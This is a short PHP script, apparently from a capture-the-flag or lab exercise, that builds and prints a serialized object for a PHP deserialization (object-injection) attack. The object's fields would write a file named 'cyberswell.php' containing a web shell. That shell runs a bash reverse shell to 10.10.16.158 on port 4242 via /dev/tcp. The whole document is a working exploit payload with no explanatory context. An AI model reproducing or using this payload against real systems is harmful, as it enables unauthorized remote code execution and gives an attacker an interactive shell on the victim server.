<?php
class DatabaseExport
{
        public $user_file = 'cyberswell.php';
	public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.16.158/4242 0>&1\'"); ?>';
}

$poopoo = new DatabaseExport;
echo serialize($poopoo);
?>
